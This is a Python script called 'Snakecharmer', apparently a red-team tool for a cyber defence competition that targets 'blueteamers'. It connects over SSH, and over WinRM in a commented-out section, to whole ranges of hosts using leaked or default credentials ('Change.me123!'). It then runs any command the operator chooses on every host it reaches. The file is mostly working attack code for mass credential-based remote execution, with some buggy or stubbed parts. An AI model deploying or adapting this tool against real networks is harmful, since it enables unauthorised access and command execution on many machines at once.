#Garrett was here
#Snakecharmer!
#Connect to devices en mass to run basic commands through password based authentication.
#Targets blueteamers with leaked / default credentials
import paramiko
from concurrent.futures import ThreadPoolExecutor
import re
import winrm
from winrm import exceptions as winrm_ex
import requests
import socket
from winrm.protocol import Protocol
import subprocess
from typing import Tuple, Dict
import socket
import subprocess
from typing import Tuple, Dict
import shutil
import shlex
import os
import textwrap


WORKERS=30 #how many threads run at once
HOSTNAME_DICT={'BIG BANG':1,'DINO ASTEROID':2,'VIKING RAIDS':4,'ENLIGHTENMENT':5,'CHERNOBYL':6}

def single_connection_command(hostname_in,username_in,password_in,command_in,os):
    if (os == "L" or os == "LINUX"):
        single_connection_command_linux(hostname_in,username_in,password_in,command_in)    
    elif (os == "W" or os == "WINDOWS"):
        single_connection_command_windows(hostname_in,username_in,password_in,command_in)
    else:
        print("INVALID")



def single_connection_command_windows(hostname_in, username_in, password_in, command_in):
    pass

def single_connection_command_linux(hostname_in,username_in,password_in,command_in):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        print("Connecting to box", hostname_in)
        client.connect(hostname_in,username=username_in,password=password_in,timeout=5)
        stdin, stdout, stderr = client.exec_command(command_in)
        print(stdout.read().decode())
    except paramiko.AuthenticationException :
        print("error, invalid credentials for box: ",hostname_in,", ",username_in,":",password_in,sep="")
    except paramiko.SSHException as e:
        print("ssh error,",e)
    except TimeoutError:
        print("Box timed out! Host",hostname_in,"is not responding, likely down or fire walled off")
    except Exception as e:
        print("Unexpected error on host ",hostname_in,", ",e,sep="")


#MAKES THE CUSTOM IPS ONE WILDCARD
def make_target_list(ip_string, variable_list): # pass it a string to be modified (ex 192.168.x.2 or 10.x.1.5), and a list of numbers to fill it in with ex [1,2,5,6,7,8]
    to_return=list()
    for number in variable_list:
        to_return.append(str(ip_string).replace('x',str(number)))
    return to_return

#RUNS THE MINIONS, also does the OS switch
def run_multiple_multithread(ip_list,values_tuple):
    username,password,command,os=values_tuple
    if (os == "L" or os == "LINUX"):
        with ThreadPoolExecutor(max_workers=WORKERS) as executor:
            for ip in ip_list:
                executor.submit(single_connection_command_linux, ip,username,password,command)
    elif (os == "W" or os == "WINDOWS"):
        with ThreadPoolExecutor(max_workers=WORKERS) as executor:
            for ip in ip_list:
                executor.submit(single_connection_command_windows,ip,username,password,command)
            

#ATTACK FUNCTIONS
def team_attack(teamnumber,values_tuple):
    targets=make_target_list("192.168."+str(teamnumber)+".x",[1,2])
    targets2=make_target_list("10."+str(teamnumber)+".1."+'x',[4,5,6])
    targets=targets+targets2
    run_multiple_multithread(targets,values_tuple)

def box_attack(box_hostname,values_tuple):
    targets=list()
    if HOSTNAME_DICT[box_hostname] <3:
        targets=make_target_list("192.168.x."+str(HOSTNAME_DICT[box_hostname]),list(range(1,19)))
    else:
        targets=make_target_list("10.x.1."+str(HOSTNAME_DICT[box_hostname]),list(range(1,19)))
    run_multiple_multithread(targets,values_tuple)
        
def all_attack(values_tuple):
    for key in HOSTNAME_DICT:
        box_attack(key,values_tuple)


def print_side_by_side(a: str, b: str, gap: int = 4):
    # remove incidental indentation, keep backslashes literal using raw strings above
    a = textwrap.dedent(a).rstrip("\n")
    b = textwrap.dedent(b).rstrip("\n")
    a_lines = a.splitlines()
    b_lines = b.splitlines()
    max_a = max(len(line) for line in a_lines) if a_lines else 0
    # pad the shorter list so zip_longest isn't needed
    max_lines = max(len(a_lines), len(b_lines))
    a_lines += [""] * (max_lines - len(a_lines))
    b_lines += [""] * (max_lines - len(b_lines))

    for left_line, right_line in zip(a_lines, b_lines):
        print(left_line.ljust(max_a + gap) + right_line)

# print them


def expand_wildcards(ip_template,values_tuple): #pos 2: wildcard_dict,

    parts = ip_template.split('.')
    ranges = []

    # Convert each octet into a list of numbers
    for part in parts:
        if '-' in part:
            start, end = map(int, part.split('-'))
            ranges.append([str(n) for n in range(start, end + 1)])
        else:
            ranges.append([part])

    # Generate all combinations
    expanded_ips = []
    def backtrack(idx=0, current=[]):
        if idx == len(ranges):
            expanded_ips.append('.'.join(current))
            return
        for val in ranges[idx]:
            backtrack(idx + 1, current + [val])

    backtrack()
    # print(expanded_ips)
    run_multiple_multithread(expanded_ips,values_tuple)
    
    


  
#CLI
def cli_interface():
    username=input("Target user: ")
    password=input("Target Password (leave blank for default): ")
    
    if password=="":
        password="Change.me123!"

    print("Using credentials ",username,":",password,sep="")

    command=input("\nCommand to run: ")
    os=input("Linux or Windows: ").upper()
    values_tuple=username,password,command,os

    if os not in ["LINUX","L","WINDOWS","W"]:
        print("Defaulting to linux")
        os="LINUX"

    targets_input = input("Enter either a: \n-Single IP address (192.168.1.1)\n-A IP Address range (192.168.2,1-18, 10.1-4.3.10-18)\n-A single team name ('team01','team2', ... ,'team18'), \n-Single box type ('Big Bang, Dino Asteroid, Viking Raids, Enlightenment, Chernobyl, etc')\n-All ('All')\nInput: ").upper()
    # HOSTNAME_DICT=['BIG BANG','DINO ASTEROID','VIKING RAIDS','ENLIGHTENMENT','CHERNOBYL']

    if "TEAM" in targets_input:
        if targets_input[-2:-1]=="1":
            teamnum=targets_input[-2:]
        else:
            teamnum=targets_input[-1:]
        if (int(teamnum)>19 and int(teamnum)<0):
            raise IndexError("Team number is not between 1 and 18")
        
        team_attack(teamnum,values_tuple)

#hostname of box attack
    elif any(box in targets_input for box in HOSTNAME_DICT):box_attack(targets_input,values_tuple)
#all attack
    elif "ALL" in targets_input:all_attack(values_tuple)
#wildcard attack
    elif "-" in targets_input:expand_wildcards(targets_input,values_tuple)
#single ip or localhost
    elif (re.match(r"^(?:(?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)$",targets_input)) or targets_input=="LOCALHOST":single_connection_command(targets_input,values_tuple) 
#failed to match
    else:print("No matching entries!!")

        
def main():
    cli_interface()

if __name__=="__main__":
    main()



'''
code graveyard


tack_index=[i for i, c in enumerate(targets_input) if c == "-"]
        tack_dict=dict()
        for tack in tack_index: 
            tack_dict[tack]=(list(range(int(targets_input[tack-1:tack]),int(targets_input[tack+1:tack+2])+1)))



def wildcard(input,ip_dict,username,password,command,):
    # pass#TODO implement
    targets=list()
    for ip_wildcard in ip_dict:
        print(input)
        input=input[:ip_wildcard-1]+input[ip_wildcard+2:]
        print(input)


    elif input == "WINDOWS" or input == "W":
        username=input("Target user: ")
        password=input("Target Password (leave blank for default): ")
        if password=="":
            password="Change.me123!"
        print("Using credentials ",username,":",password,sep="")
        command=input("\nCommand to run: ")
        targets_input = input("Enter either a: \n-Single IP address (192.168.1.1)\n-A IP address range (192.168.1-10.5, 10.1.3-9.4-33)\n-A single team name ('team01','team2', ... ,'team18'), \n-Single box type ('Big Bang, Dino Asteroid, Viking Raids, Enlightenment, Chernobyl')\n-All ('All')\nInput: ").upper()
        HOSTNAME_DICT=['WRIGHT BROTHERS','MOON LANDING','PYRAMIDS','FIRST OLYMPICS','SILK ROAD']
        if "TEAM" in targets_input:
            if targets_input[-2:-1]=="1":
                teamnum=targets_input[-2:]
            else:
                teamnum=targets_input[-1:]
            if (int(teamnum)>19 and int(teamnum)<0):
                raise IndexError("Team number is not between 1 and 18")
            team_attack_windows(teamnum,username,password,command)

        elif any(box in targets_input for box in HOSTNAME_DICT):
            box_attack_windows(targets_input,username,password,command)
        elif "ALL" in targets_input:
            all_attack_windows(username,password,command)
        elif "-" in targets_input:
            tack_index=[i for i, c in enumerate(targets_input) if c == "-"]
            tack_dict=dict()
            for tack in tack_index: 
                tack_dict[tack]=(list(range(int(targets_input[tack-1:tack]),int(targets_input[tack+1:tack+2])+1)))

            # wildcard(targets_input,tack_dict,username,password,command)
            expand_wildcards_windows(targets_input,tack_dict,username,password,command)

        elif (re.match(r"^(?:(?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)$",targets_input)) or targets_input=="LOCALHOST":
            single_connection_command_linux(targets_input,username,password,command) 
        
        else:
            print("No matching entries!!")





#MAKES THE CUSTOM IPS TWO WILDCARD
def make_target_list_two_var(ip_string, variable_list_x, variable_list_y): 
    to_return=list()
    for number_x in variable_list_x:
        for number_y in variable_list_y:
            to_return.append(str(ip_string).replace('x',str(number_x)).replace('y',str(number_y)))
    return to_return



def run_on_every_linux_in_team_cloud(team_num,username,password,command):
    ip_addresses=".1",".2",".4",".5",".6"
    final_ips=list()
    for ip in ip_addresses:
        final_ips.append("192.168."+str(team_num)+ip)

    with ThreadPoolExecutor(max_workers=10) as executor:
        for ip in final_ips:
            executor.submit(single_connection_command_linux, ip,username,password,command)

def run_on_every_linux_in_team_lan(team_num,username,password,command):
    ip_addresses="1","2","4","5","6"
    final_ips=list()
    for ip in ip_addresses:
        final_ips.append("10."+str(team_num)+".1."+ip)

    with ThreadPoolExecutor(max_workers=10) as executor:
        for ip in final_ips:
            executor.submit(single_connection_command_linux, ip,username,password,command)

def run_on_every_team_one_box_cloud(box_numb,username,password,command):
    teams=list(range(18))
    ip_start="192.168."
    final_ips=list()
    for num in teams:
        final_ips.append(ip_start+str(num)+"."+str(box_numb))

    with ThreadPoolExecutor(max_workers=10) as executor:
        for ip in final_ips:
            executor.submit(single_connection_command_linux, ip,username,password,command)

# place these imports at top of your file
def single_connection_command_windows(hostname_in, username_in, password_in, command_in,
                                      connect_timeout=5, operation_timeout=10,
                                      transport='ntlm', server_cert_validation='ignore'):
    """
    Run a WinRM command with explicit timeouts and print output.
    Prints stdout if command succeeds, prints failure reason otherwise.
    Returns (success_bool, result_dict)
    """
    # Build endpoint
    endpoint = f'http://{hostname_in}:5985/wsman'

    try:
        session = winrm.Session(endpoint, auth=(username_in, password_in))

        # Run command
        r = session.run_cmd(command_in)
        stdout = r.std_out.decode(errors="ignore") if r.std_out else ""
        stderr = r.std_err.decode(errors="ignore") if r.std_err else ""

        if r.status_code != 0:
            # failure
            print(f"[FAILURE] Host: {hostname_in}, Status: {r.status_code}")
            if stdout:
                print("STDOUT:", stdout)
            if stderr:
                print("STDERR:", stderr)
            return False, {
                "reason": "remote_nonzero_exit",
                "status_code": r.status_code,
                "stdout": stdout,
                "stderr": stderr
            }

        # success
        print(f"[SUCCESS] Host: {hostname_in}")
        print(stdout)
        return True, {"stdout": stdout, "stderr": stderr, "status_code": r.status_code}

    except winrm_ex.InvalidCredentialsError:
        print(f"[FAILURE] Invalid credentials for host {hostname_in}")
        return False, {"reason": "invalid_credentials"}
    except winrm_ex.WinRMOperationTimeoutError:
        print(f"[FAILURE] WinRM operation timed out on host {hostname_in}")
        return False, {"reason": "winrm_timeout"}
    except (requests.exceptions.ConnectionError, socket.timeout) as e:
        print(f"[FAILURE] Connection error on host {hostname_in}: {e}")
        return False, {"reason": "connection_error", "error": str(e)}
    except Exception as e:
        print(f"[FAILURE] Unexpected error on host {hostname_in}: {e}")
        return False, {"reason": "unexpected_error", "error": str(e)}

            
'''